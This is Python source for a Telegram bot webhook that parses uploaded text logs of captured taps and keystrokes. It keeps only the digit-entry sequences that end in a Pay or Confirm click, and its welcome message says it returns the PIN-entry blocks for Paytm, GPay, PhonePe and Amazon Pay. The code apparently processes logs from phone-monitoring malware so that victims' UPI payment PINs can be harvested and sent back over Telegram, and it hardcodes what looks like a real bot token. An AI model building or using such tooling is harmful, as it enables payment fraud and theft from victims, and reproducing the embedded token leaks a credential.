from http.server import BaseHTTPRequestHandler
import os
import re
import io
import json
import urllib.request
import urllib.parse

BOT_TOKEN = os.environ.get("BOT_TOKEN") or "8988822557:AAGqj15yrlVAKKCFE_Heb8yQ7ojCXc25iIw"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

APP_LINE_RE = re.compile(
    r"^\s*(TEXT|CLICKED)\s*->\s*(?P<app>[^\[\]\-]+?)\s*->\s*\[(?P<val>.*?)\]\s*$",
    re.I,
)
SUBMIT_WORDS = re.compile(
    r"^(Pay|Check|Confirm|Submit|Done|Verify|OK|Proceed.*|Pay\s*₹.*)$", re.I
)
DIGIT_ONLY = re.compile(r"^\d{1,8}$")


def filter_lines(text: str) -> str:
    blocks = []
    current = []
    max_digit_len = 0
    has_clicked_digit = False

    def close():
        nonlocal current, max_digit_len, has_clicked_digit
        if current and max_digit_len >= 4 and has_clicked_digit:
            blocks.append("\n".join(current))
        current = []
        max_digit_len = 0
        has_clicked_digit = False

    for raw in text.splitlines():
        ln = raw.rstrip()
        if not ln.strip():
            continue
        m = APP_LINE_RE.match(ln)
        if not m:
            close()
            continue
        event = m.group(1).upper()
        val = m.group("val").strip()
        if DIGIT_ONLY.match(val):
            current.append(ln)
            max_digit_len = max(max_digit_len, len(val))
            if event == "CLICKED":
                has_clicked_digit = True
        elif SUBMIT_WORDS.match(val) and current:
            current.append(ln)
            close()
        else:
            close()
    close()
    return "\n\n".join(blocks)


def tg_call(method: str, payload: dict) -> dict:
    data = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(f"{API}/{method}", data=data)
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read())


def send_message(chat_id: int, text: str) -> None:
    try:
        tg_call("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception:
        # Retry without Markdown if parse fails
        tg_call("sendMessage", {"chat_id": chat_id, "text": text})


def send_document(chat_id: int, filename: str, content: bytes, caption: str = "") -> None:
    boundary = "----filterbotboundary"
    parts = []
    parts.append(f"--{boundary}\r\n".encode())
    parts.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
    parts.append(f"{chat_id}\r\n".encode())
    if caption:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
        parts.append(f"{caption}\r\n".encode())
    parts.append(f"--{boundary}\r\n".encode())
    parts.append(
        f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode()
    )
    parts.append(b"Content-Type: text/plain\r\n\r\n")
    parts.append(content)
    parts.append(f"\r\n--{boundary}--\r\n".encode())
    body = b"".join(parts)
    req = urllib.request.Request(
        f"{API}/sendDocument",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        r.read()


def download_tg_file(file_id: str) -> bytes:
    info = tg_call("getFile", {"file_id": file_id})
    path = info["result"]["file_path"]
    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.read()


def handle_update(update: dict) -> None:
    msg = update.get("message") or update.get("edited_message")
    if not msg:
        return
    chat_id = msg["chat"]["id"]
    text = msg.get("text", "") or ""

    if text.startswith("/start"):
        send_message(
            chat_id,
            "Send me a .txt log file. I'll return only the Paytm / GPay / PhonePe / "
            "Amazon Pay PIN-entry blocks.",
        )
        return

    doc = msg.get("document")
    if not doc:
        send_message(chat_id, "Please send a .txt file.")
        return

    name = doc.get("file_name", "input.txt")
    if not name.lower().endswith(".txt"):
        send_message(chat_id, "Please send a .txt file.")
        return

    raw = download_tg_file(doc["file_id"])
    content = raw.decode("utf-8", errors="ignore")
    filtered = filter_lines(content)

    if not filtered:
        send_message(chat_id, "No PIN-entry blocks found in this file.")
        return

    if len(filtered) > 3500:
        send_document(chat_id, "filtered_" + name, filtered.encode("utf-8"))
    else:
        send_message(chat_id, "```\n" + filtered + "\n```")


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"Filterbot webhook alive")

    def do_POST(self):
        try:
            length = int(self.headers.get("content-length", "0") or "0")
            body = self.rfile.read(length) if length else b"{}"
            update = json.loads(body or b"{}")
            handle_update(update)
        except Exception as e:
            print(f"filterbot error: {e}")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')
